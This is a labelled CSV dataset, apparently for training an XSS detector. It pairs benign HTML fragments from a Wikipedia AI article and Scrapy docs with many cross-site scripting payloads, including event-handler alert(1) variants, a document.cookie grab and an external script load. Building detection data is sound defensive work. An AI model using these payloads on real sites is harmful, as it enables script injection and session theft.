,kod,label
458," </p><p>In 2011, a <i><a href=""/wiki/Jeopardy!"" title=""Jeopardy!"">Jeopardy! </a> </i> <a href=""/wiki/Quiz_show"" class=""mw-redirect"" title=""Quiz show"">quiz show </a> exhibition match, <a href=""/wiki/IBM"" title=""IBM"">IBM </a>'s <a href=""/wiki/Question_answering_system"" class=""mw-redirect"" title=""Question answering system"">question answering system </a>, <a href=""/wiki/Watson_(artificial_intelligence_software)"" class=""mw-redirect"" title=""Watson (artificial intelligence software)"">Watson </a>, defeated the two greatest <i>Jeopardy! </i> champions, <a href=""/wiki/Brad_Rutter"" title=""Brad Rutter"">Brad Rutter </a> and <a href=""/wiki/Ken_Jennings"" title=""Ken Jennings"">Ken Jennings </a>, by a significant margin.<sup id=""cite_ref-FOOTNOTEMarkoff2011_45-0"" class=""reference""><a href=""#cite_note-FOOTNOTEMarkoff2011-45"">&#91;45&#93; </a> </sup> <a href=""/wiki/Moore%27s_law"" title=""Moore&#39;s law"">Faster computers </a>, algorithmic improvements, and access to <a href=""/wiki/Big_data"" title=""Big data"">large amounts of data </a> enabled advances in <a href=""/wiki/Machine_learning"" title=""Machine learning"">machine learning </a> and perception; data-hungry <a href=""/wiki/Deep_learning"" title=""Deep learning"">deep learning </a> methods started to dominate accuracy benchmarks <a href=""/wiki/Deep_learning#Deep_learning_revolution"" title=""Deep learning"">around 2012 </a>.<sup id=""cite_ref-46"" class=""reference""><a href=""#cite_note-46"">&#91;46&#93; </a> </sup> The <a href=""/wiki/Kinect"" title=""Kinect"">Kinect </a>, which provides a 3D body–motion interface for the <a href=""/wiki/Xbox_360"" title=""Xbox 360"">Xbox 360 </a> and the <a href=""/wiki/Xbox_One"" title=""Xbox One"">Xbox One </a>, uses algorithms that emerged from lengthy AI research<sup id=""cite_ref-47"" class=""reference""><a href=""#cite_note-47"">&#91;47&#93; </a> </sup> as do <a href=""/wiki/Intelligent_personal_assistant"" class=""mw-redirect"" title=""Intelligent personal assistant"">intelligent personal assistants </a> in <a href=""/wiki/Smartphone"" title=""Smartphone"">smartphones </a>.<sup id=""cite_ref-48"" class=""reference""><a href=""#cite_note-48"">&#91;48&#93; </a> </sup> In March 2016, <a href=""/wiki/AlphaGo"" title=""AlphaGo"">AlphaGo </a> won 4 out of 5 games of <a href=""/wiki/Go_(game)"" title=""Go (game)"">Go </a> in a match with Go champion <a href=""/wiki/Lee_Sedol"" title=""Lee Sedol"">Lee Sedol </a>, becoming the first <a href=""/wiki/Computer_Go"" title=""Computer Go"">computer Go-playing system </a> to beat a professional Go player without <a href=""/wiki/Go_handicaps"" class=""mw-redirect"" title=""Go handicaps"">handicaps </a>.<sup id=""cite_ref-bbc-alphago_8-1"" class=""reference""><a href=""#cite_note-bbc-alphago-8"">&#91;8&#93; </a> </sup><sup id=""cite_ref-49"" class=""reference""><a href=""#cite_note-49"">&#91;49&#93; </a> </sup> In the 2017 <a href=""/wiki/Future_of_Go_Summit"" title=""Future of Go Summit"">Future of Go Summit </a>, <a href=""/wiki/AlphaGo"" title=""AlphaGo"">AlphaGo </a> won a <a href=""/wiki/AlphaGo_versus_Ke_Jie"" title=""AlphaGo versus Ke Jie"">three-game match </a> with <a href=""/wiki/Ke_Jie"" title=""Ke Jie"">Ke Jie </a>,<sup id=""cite_ref-50"" class=""reference""><a href=""#cite_note-50"">&#91;50&#93; </a> </sup> who at the time continuously held the world No. 1 ranking for two years.<sup id=""cite_ref-51"" class=""reference""><a href=""#cite_note-51"">&#91;51&#93; </a> </sup><sup id=""cite_ref-52"" class=""reference""><a href=""#cite_note-52"">&#91;52&#93; </a> </sup> This marked the completion of a significant milestone in the development of Artificial Intelligence as Go is a relatively complex game, more so than Chess.",0
459,<time onblur=alert(1) tabindex=1 id=x></time><input autofocus>,1
460,"<div draggable=""true"" contenteditable>drag me</div><template ondrop=alert(1) contenteditable>drop here</template>",1
461,"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, p.&#160;28 </li>",0
462,"<li><a href=""#CITEREFNilsson1998"">Nilsson 1998 </a>, chpt. 19.4 &amp; 7 </li> </ul>",0
463,<object onpointerup=alert(1)>XSS</object>,1
464,"	 </span></p>",0
465,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0
466,</script>,0
467,<svg><menu onload=alert(1)></menu>,1
468,"<rt draggable=""true"" ondragenter=""alert(1)"">test</rt>",1
469,<rtc onfocusout=alert(1) tabindex=1 id=x></rtc><input autofocus>,1
470,"<pre onmouseleave=""alert(1)"">test</pre>",1
471,<col id=x tabindex=1 onactivate=alert(1)></col>,1
472,<p id=x tabindex=1 onfocusin=alert(1)></p>,1
473,"<div draggable=""true"" contenteditable>drag me</div><samp ondragover=alert(1) contenteditable>drop here</samp>",1
474, </li>,0
475, </div> </td> </tr> </tbody> </table>,0
476,"<h3><span class=""mw-headline"" id=""Learning"">Learning ",0
477,"<nextid onclick=""alert(1)"">test</nextid>",1
478,"<ul><li><a href=""/wiki/Space_probe"" title=""Space probe"">Space probe </a> </li> </ul> </li>",0
479,"<ins onkeyup=""alert(1)"" contenteditable>test</ins>",1
480,</div>,0
481,"<style>@keyframes x{}</style><ins style=""animation-name:x"" onanimationstart=""alert(1)""></ins>",1
482, </li>,0
483,"          <dd><a href=""/en/2.0/"">2.0</a></dd>",0
484,"<dl onmouseout=""alert(1)"">test</dl>",1
485,"	 <div id=""Emerging_technologies_in_information_and_communications"" style=""font-size:114%;margin:0 4em""><a href=""/wiki/Emerging_technologies"" title=""Emerging technologies"">Emerging technologies </a> in <a href=""/wiki/Information_and_communications_technology"" title=""Information and communications technology"">information and communications </a> </div> </th> </tr><tr><td colspan=""2"" class=""navbox-list navbox-odd"" style=""width:100%;padding:0px"">",0
486,"<command onmouseleave=""alert(1)"">test</command>",1
487,"<Input value = """" type = text>",1
488,<h1 id=x tabindex=1 onactivate=alert(1)></h1>,1
489,"<li><a href=""/wiki/Natural_language_processing"" title=""Natural language processing"">Natural language processing </a> </li>",0
490,"<form onmousedown=""alert(1)"">test</form>",1
491,"	 </span> </a>",0
492,"<li><a href=""/wiki/Alexey_Lyapunov"" title=""Alexey Lyapunov"">Alexey Lyapunov </a> </li>",0
493,"<spacer draggable=""true"" ondrag=""alert(1)"">test</spacer>",1
494,"<em onclick=""alert(1)"">test</em>",1
495,"<li><a href=""/wiki/Otto_Neurath"" title=""Otto Neurath"">Otto Neurath </a> </li>",0
496,"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0
497,"<style>@keyframes x{}</style><rtc style=""animation-name:x"" onanimationend=""alert(1)""></rtc>",1
498,"	 <div style=""padding:0em 0.25em"">",0
499,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0
500,"<li><a href=""/wiki/Networking_hardware"" title=""Networking hardware"">Network components </a> </li>",0
501,"	 </span> <span class=""reference-text"">",0
502," </tr><tr><th style=""padding:0.1em"">",0
503,<bgsound id=x tabindex=1 ondeactivate=alert(1)></bgsound><input id=y autofocus>,1
504,"<marquee onkeyup=""alert(1)"" contenteditable>test</marquee>",1
505,"<div draggable=""true"" contenteditable>drag me</div><embed ondragover=alert(1) contenteditable>drop here</embed>",1
506, </li>,0
507,"<code onmouseout=""alert(1)"">test</code>",1
508,"	 </span> <span class=""reference-text"">",0
509,"	 </span> <span class=""reference-text""><cite class=""citation web"">Allen, Gregory (6 February 2019). <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20190317004017/https://www.cnas.org/publications/reports/understanding-chinas-ai-strategy"">""Understanding China's AI Strategy"" </a>. <i>www.cnas.org/publications/reports/understanding-chinas-ai-strategy </i>. Center for a New American Security. Archived from <a rel=""nofollow"" class=""external text"" href=""https://www.cnas.org/publications/reports/understanding-chinas-ai-strategy"">the original </a> on 17 March 2019<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">17 March ",0
510,<option onpointerout=alert(1)>XSS</option>,1
511,"won many visual pattern recognition competitions.<sup id=""cite_ref-schmidhuber2015_246-2"" class=""reference""><a href=""#cite_note-schmidhuber2015-246"">&#91;235&#93; </a> </sup>",0
512,"<ul><li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;17–25 </li> </ul>",0
513,<rt onpointerout=alert(1)>XSS</rt>,1
514,"<q onmouseenter=""alert(1)"">test</q>",1
515,"<div class=""toctree-wrapper compound"">",0
516,"<element onbeforecopy=""alert(1)"" contenteditable>test</element>",1
517,"<li class=""toctree-l1""><a class=""reference internal"" href=""intro/examples.html"">Examples</a></li>",0
518,"<ul><li><a href=""/wiki/Printed_circuit_board"" title=""Printed circuit board"">Printed circuit board </a> </li>",0
519,"<style>@keyframes x{}</style><main style=""animation-name:x"" onanimationend=""alert(1)""></main>",1
520,<base id=x tabindex=1 onfocusin=alert(1)></base>,1
521,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><acronym id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></acronym>",1
522,"<b onmouseout=""alert(1)"">test</b>",1
523,"<acronym draggable=""true"" ondrag=""alert(1)"">test</acronym>",1
524,"	 <div class=""plainlinks hlist navbar mini""><ul><li class=""nv-view""><a href=""/wiki/Template:Evolutionary_computation"" title=""Template:Evolutionary computation""><abbr title=""View this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">v </abbr> </a> </li><li class=""nv-talk""><a href=""/wiki/Template_talk:Evolutionary_computation"" title=""Template talk:Evolutionary computation""><abbr title=""Discuss this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">t </abbr> </a> </li><li class=""nv-edit""><a class=""external text"" href=""https://en.wikipedia.org/w/index.php?title=Template:Evolutionary_computation&amp;action=edit""><abbr title=""Edit this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">e </abbr> </a> </li> </ul> </div>",0
525,"        <nav data-toggle=""wy-nav-shift"" class=""wy-nav-side"">",0
526,"<small draggable=""true"" ondragend=""alert(1)"">test</small>",1
527,<ul onpointermove=alert(1)>XSS</ul>,1
528,<ol onpointerenter=alert(1)>XSS</ol>,1
529,"<link onbeforecopy=""alert(1)"" contenteditable>test</link>",1
530,"<html onbeforecut=""alert(1)"" contenteditable>test</html>",1
531,"<video autoplay controls onseeking=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",1
532,"<i onmouseup=""alert(1)"">test</i>",1
533,<title onpointerup=alert(1)>XSS</title>,1
534,<select onchange=alert(1)><option>change me</option><option>XSS</option></select>,1
535,Historical influence and philosophical implications:,0
536,"<style>@keyframes slidein {}</style><dialog style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dialog>",1
537,"<del onbeforepaste=""alert(1)"" contenteditable>test</del>",1
538,"<style>:target {color:red;}</style><b id=x style=""transition:color 1s"" ontransitionend=alert(1)></b>",1
539,<textarea autofocus onfocus=alert(1)>test</textarea>,1
540,"<bdo ondblclick=""alert(1)"">test</bdo>",1
541,"	 </span></a></dt><dd>Understand what Scrapy is and how it can help you.</dd>",0
542,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><thead id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></thead>",1
543,<dfn onblur=alert(1) tabindex=1 id=x></dfn><input autofocus>,1
544,"	 </span> </li>",0
545,<section id=x tabindex=1 onfocus=alert(1)></section>,1
546, </p>,0
547,"	 </span>",0
548,<details ontoggle=alert(1) open>test</details>,1
549,<element onpointerleave=alert(1)>XSS</element>,1
550,"	 </span> </li>",0
551,"<li class=""toctree-l1""><a class=""reference internal"" href=""contributing.html"">Contributing to Scrapy</a></li>",0
552,<form onpointerenter=alert(1)>XSS</form>,1
553,<optgroup onpointerout=alert(1)>XSS</optgroup>,1
554,"<style>:target {color:red;}</style><u id=x style=""transition:color 1s"" ontransitionend=alert(1)></u>",1
555,"<dt><a class=""reference internal"" href=""topics/commands.html""><span class=""doc"">Command line tool",0
556,<button onfocusout=alert(1) id=x></button><input autofocus>,1
557,<small id=x tabindex=1 onactivate=alert(1)></small>,1
558,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0
559,"Definition of AI as the study of <a href=""/wiki/Intelligent_agents"" class=""mw-redirect"" title=""Intelligent agents"">intelligent agents </a>:",0
560,<video id=x tabindex=1 onbeforeactivate=alert(1)></video>,1
561,"<video onbeforepaste=""alert(1)"" contenteditable>test</video>",1
562,"<style>@keyframes x{}</style><rb style=""animation-name:x"" onanimationend=""alert(1)""></rb>",1
563,"  <link rel=""stylesheet"" href=""_static/css/tooltipster.bundle.min.css"" type=""text/css"" />",0
564,"<rtc oncontextmenu=""alert(1)"">test</rtc>",1
565,<nextid onpointermove=alert(1)>XSS</nextid>,1
566,"<li><a href=""/wiki/Modeling_language"" title=""Modeling language"">Modeling language </a> </li>",0
567,"<dt><a class=""reference internal"" href=""topics/developer-tools.html""><span class=""doc"">Using your browser’s Developer Tools for scraping",0
568,<discard onpointerenter=alert(1)>XSS</discard>,1
569,<kbd onfocusout=alert(1) tabindex=1 id=x></kbd><input autofocus>,1
570,"<rp onmousemove=""alert(1)"">test</rp>",1
571, </li>,0
572,"<li><a href=""/wiki/Future_of_Humanity_Institute"" title=""Future of Humanity Institute"">Future of Humanity Institute </a> </li>",0
573,"<li><a href=""/wiki/Materialism"" title=""Materialism"">Materialism </a> </li>",0
574,"<image onmouseup=""alert(1)"">test</image>",1
575,"<style>@keyframes x{}</style><address style=""animation-name:x"" onanimationend=""alert(1)""></address>",1
576,"<li id=""cite_note-Gödel_himself-356""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Gödel_himself_356-0"">^ </a> </b> ",0
577,<a id=x tabindex=1 ondeactivate=alert(1)></a><input id=y autofocus>,1
578,<dt onfocusout=alert(1) tabindex=1 id=x></dt><input autofocus>,1
579,"<textarea onkeypress=""alert(1)"" contenteditable>test</textarea>",1
580,"<li><cite id=""CITEREFAlbus2002"" class=""citation encyclopaedia"">Albus, J. S. (2002). ""4D/RCS: A reference model architecture for intelligent unmanned ground vehicles"".  In Gerhart, G.; Gunderson, R.; Shoemaker, C. (eds.). <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20040725051856/http://www.isd.mel.nist.gov/documents/albus/4DRCS.pdf""><i>4-D/RCS: A Reference Model Architecture for Intelligent Unmanned Ground Vehicles </i> </a> <span class=""cs1-format"">(PDF) ",0
581,"<template onmouseout=""alert(1)"">test</template>",1
582,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><area id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></area>",1
583,"	 </span> <span class=""reference-text"">Igor Aizenberg, Naum N. Aizenberg, Joos P.L. Vandewalle (2000). Multi-Valued and Universal Binary Neurons: Theory, Learning and Applications. Springer Science &amp; Business Media. ",0
584,"<footer onmouseenter=""alert(1)"">test</footer>",1
585,"<li><a href=""/wiki/Substance_dualism"" class=""mw-redirect"" title=""Substance dualism"">Substance dualism </a> </li> </ul>",0
586,          <dd>,0
587,"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;22–23 </li> </ul>",0
588,"<canvas onbeforecopy=""alert(1)"" contenteditable>test</canvas>",1
589,"<rt onbeforepaste=""alert(1)"" contenteditable>test</rt>",1
590,"<a href=""/wiki/Computational_intelligence"" title=""Computational intelligence"">Computational intelligence </a>",0
591, </li>,0
592,"<style>:target {transform: rotate(180deg);}</style><code id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></code>",1
593,<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe,1
594,<dd id=x tabindex=1 onfocus=alert(1)></dd>,1
595,"<b draggable=""true"" ondragstart=""alert(1)"">test</b>",1
596,document.documentURI,1
597,Set.constructor`alert\x28document.domain\x29```,1
598,"<nobr oncontextmenu=""alert(1)"">test</nobr>",1
599,<center onpointerdown=alert(1)>XSS</center>,1
600,"<style>:target {transform: rotate(180deg);}</style><applet id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></applet>",1
601,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0
602,"<dt><a class=""reference internal"" href=""faq.html""><span class=""doc"">Frequently Asked Questions",0
603,"SRC=# onmouseover=""alert(document.cookie)",1
604,<command id=x tabindex=1 ondeactivate=alert(1)></command><input id=y autofocus>,1
605,"<applet onkeydown=""alert(1)"" contenteditable>test</applet>",1
606,"	 </span> </h3>",0
607,"<li class=""toctree-l1""><a class=""reference internal"" href=""intro/overview.html"">Scrapy at a glance</a></li>",0
608,"<li><a href=""/wiki/Psychoanalysis"" title=""Psychoanalysis"">Psychoanalysis </a> </li>",0
609,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><details id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></details>",1
610,"<div draggable=""true"" contenteditable>drag me</div><acronym ondrop=alert(1) contenteditable>drop here</acronym>",1
611,"<td onbeforecopy=""alert(1)"" contenteditable>test</td>",1
612,"<param onbeforecopy=""alert(1)"" contenteditable>test</param>",1
613,"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""httx://.rocks/.js""></SCRIPT>",1
614,"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/asyncio.html"">asyncio</a></li>",0
615,"<li id=""cite_note-380""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-380"">^ </a> </b> ",0
616,"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/signals.html"">Signals</a></li>",0
617,"<table onkeyup=""alert(1)"" contenteditable>test</table>",1
618,"<a draggable=""true"" ondragleave=""alert(1)"">test</a>",1
619,<svg><figcaption onload=alert(1)></figcaption>,1
620,"<nextid onmouseup=""alert(1)"">test</nextid>",1
621,"<style>:target {color:red;}</style><ruby id=x style=""transition:color 1s"" ontransitionend=alert(1)></ruby>",1
622,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0
623,<colgroup onpointerover=alert(1)>XSS</colgroup>,1
624,"<p draggable=""true"" ondragleave=""alert(1)"">test</p>",1
625,"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/dynamic-content.html"">Selecting dynamically-loaded content</a></li>",0
626,"	 </span></p>",0
627,"<meter draggable=""true"" ondragend=""alert(1)"">test</meter>",1
628,"<progress draggable=""true"" ondrag=""alert(1)"">test</progress>",1
629,"<dl class=""docutils"">",0
630, ,0
631,<xss id=x tabindex=1 ondeactivate=alert(1)></xss><input autofocus>,1
632,"<rtc onmouseleave=""alert(1)"">test</rtc>",1
633,"<li><a href=""/wiki/Glossary_of_artificial_intelligence"" title=""Glossary of artificial intelligence"">Glossary of artificial intelligence </a> </li>",0
634,"	 </span> <span class=""reference-text""><cite class=""citation book""><a rel=""nofollow"" class=""external text"" href=""https://ec.europa.eu/info/sites/info/files/commission-white-paper-artificial-intelligence-feb2020_en.pdf""><i>White Paper: On Artificial Intelligence - A European approach to excellence and trust </i> </a> <span class=""cs1-format"">(PDF) ",0
635,"<legend oncopy=""alert(1)"" contenteditable>test</legend>",1
636,"<li><a href=""/wiki/Epistemological_anarchism"" title=""Epistemological anarchism"">Epistemological anarchism </a> </li>",0
637,<nav id=x tabindex=1 onbeforedeactivate=alert(1)></nav><input autofocus>,1
638,"	 </span> </li>",0
639,"<style onkeydown=""alert(1)"" contenteditable>test</style>",1
640,"<style>@keyframes x{}</style><ruby style=""animation-name:x"" onanimationend=""alert(1)""></ruby>",1
641,"<div role=""note"" class=""hatnote navigation-not-searchable"">Main articles: <a href=""/wiki/Hard_problem_of_consciousness"" title=""Hard problem of consciousness"">Hard problem of consciousness </a> and <a href=""/wiki/Theory_of_mind"" title=""Theory of mind"">Theory of mind </a> </div>",0
642,"<li><cite id=""CITEREFKoza1992"" class=""citation book"">Koza, John R. (1992). <i>Genetic Programming (On the Programming of Computers by Means of Natural Selection) </i>. MIT Press. <a href=""/wiki/Bibcode"" title=""Bibcode"">Bibcode </a>:<a rel=""nofollow"" class=""external text"" href=""https://ui.adsabs.harvard.edu/abs/1992gppc.book.....K"">1992gppc.book.....K </a>. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-262-11170-6"" title=""Special:BookSources/978-0-262-11170-6""><bdi>978-0-262-11170-6 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Genetic+Programming+%28On+the+Programming+of+Computers+by+Means+of+Natural+Selection%29&amp;rft.pub=MIT+Press&amp;rft.date=1992&amp;rft_id=info%3Abibcode%2F1992gppc.book.....K&amp;rft.isbn=978-0-262-11170-6&amp;rft.aulast=Koza&amp;rft.aufirst=John+R.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
643,"<li><a href=""/wiki/Information_retrieval"" title=""Information retrieval"">Information retrieval </a> </li> </ul>",0
644,"<dfn draggable=""true"" ondragenter=""alert(1)"">test</dfn>",1
645,"<script onbeforepaste=""alert(1)"" contenteditable>test</script>",1
646,"<li id=""cite_note-300""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-300"">^ </a> </b> ",0
647,<div onpointermove=alert(1)>XSS</div>,1
648,"<menu oncontextmenu=""alert(1)"">test</menu>",1
649," </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Academic_journal"" title=""Academic journal"">Journals </a> </th><td class=""navbox-list navbox-even hlist"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0
650,"""<a href=""/wiki/History_of_AI#The_golden_years_1956–1974"" class=""mw-redirect"" title=""History of AI"">Golden years </a>"" of AI (successful symbolic reasoning programs 1956–1973):",0
651,<shadow onpointerdown=alert(1)>XSS</shadow>,1
652,<rt id=x tabindex=1 onbeforeactivate=alert(1)></rt>,1
653,<main id=x tabindex=1 onbeforedeactivate=alert(1)></main><input autofocus>,1
654,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/>. McCarthy recently reiterated his position at the <a href=""/wiki/AI@50"" title=""AI@50"">AI@50 </a> conference where he said ""Artificial intelligence is not, by definition, simulation of human intelligence"" (<a href=""#CITEREFMaker2006"">Maker 2006 </a>). </li> </ul>",0
655,"<dt><a class=""reference internal"" href=""topics/coroutines.html""><span class=""doc"">Coroutines",0
656,"	 </span></a></dt><dd>Deploying your Scrapy spiders and run them in a remote server.</dd>",0
657,"<li id=""cite_note-84""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-84"">^ </a> </b> ",0
658," </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Related topics </th><td class=""navbox-list navbox-odd hlist"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0
659,"<style>:target {color: red;}</style><tr id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></tr>",1
660,"<ul draggable=""true"" ondragend=""alert(1)"">test</ul>",1
661,"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=IEEE+Spectrum%3A+Technology%2C+Engineering%2C+and+Science+News&amp;rft.atitle=Full+Page+Reload&amp;rft_id=https%3A%2F%2Fspectrum.ieee.org%2Fbiomedical%2Fdiagnostics%2Fhow-ibm-watson-overpromised-and-underdelivered-on-ai-health-care&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
662,"<li><a href=""/wiki/Stuart_J._Russell"" title=""Stuart J. Russell"">Stuart J. Russell </a> </li>",0
663,document.URL,1
664,"<div draggable=""true"" contenteditable>drag me</div><image ondragover=alert(1) contenteditable>drop here</image>",1
665,"<command onclick=""alert(1)"">test</command>",1
666,<img2 onpointermove=alert(1)>XSS</img2>,1
667,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0
668,<bdo id=x tabindex=1 onfocus=alert(1)></bdo>,1
669,<svg id=x tabindex=1 onactivate=alert(1)></svg>,1
670,<datalist id=x tabindex=1 ondeactivate=alert(1)></datalist><input id=y autofocus>,1
671,"	 </span> </li>",0
672,"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=NextBigWhat&amp;rft.atitle=AI+traffic+signals+to+be+installed+in+Bengaluru+soon&amp;rft.date=2019-09-24&amp;rft_id=https%3A%2F%2Fnextbigwhat.com%2Fai-traffic-signals-to-be-installed-in-bengaluru-soon%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
673,"document.querySelector("".example"")",1
674,"<map onmouseleave=""alert(1)"">test</map>",1
675,"<strong draggable=""true"" ondragleave=""alert(1)"">test</strong>",1
676,"	 </span> </h2>",0
677,"<rp draggable=""true"" ondragstart=""alert(1)"">test</rp>",1
678,"	 </span> </h3>",0
679,"<div draggable=""true"" contenteditable>drag me</div><script ondrop=alert(1) contenteditable>drop here</script>",1
680, </p>,0
681,"	 </span> <span class=""toctext"">Cybernetics and brain simulation ",0
682,"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">",1
683,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0
684,"<tbody draggable=""true"" ondragleave=""alert(1)"">test</tbody>",1
685,<big onpointerleave=alert(1)>XSS</big>,1
686,"	 </span> </h2>",0
687,<details onpointerdown=alert(1)>XSS</details>,1
688,"<dt><a class=""reference internal"" href=""intro/tutorial.html""><span class=""doc"">Scrapy Tutorial",0
689,"<style>@keyframes x{}</style><svg style=""animation-name:x"" onanimationstart=""alert(1)""></svg>",1
690,"<plaintext onbeforecut=""alert(1)"" contenteditable>test</plaintext>",1
691,<small id=x tabindex=1 ondeactivate=alert(1)></small><input id=y autofocus>,1
692,"<li><a href=""/wiki/Intrusion_detection_system"" title=""Intrusion detection system"">Intrusion detection system </a> </li>",0
693,<noframes onpointerleave=alert(1)>XSS</noframes>,1
694,"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=57"" title=""Edit section: Artificial moral agents"">edit </a><span class=""mw-editsection-bracket"">] ",0
695,"<ruby onmousemove=""alert(1)"">test</ruby>",1
696,"<dt><a class=""reference internal"" href=""topics/shell.html""><span class=""doc"">Scrapy shell",0
697,"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/api.html"">Core API</a></li>",0
698,"<style>:target {transform: rotate(180deg);}</style><dt id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></dt>",1
699,"<ruby oncopy=""alert(1)"" contenteditable>test</ruby>",1
700, </li>,0
701,"<style>@keyframes x{}</style><pre style=""animation-name:x"" onanimationstart=""alert(1)""></pre>",1
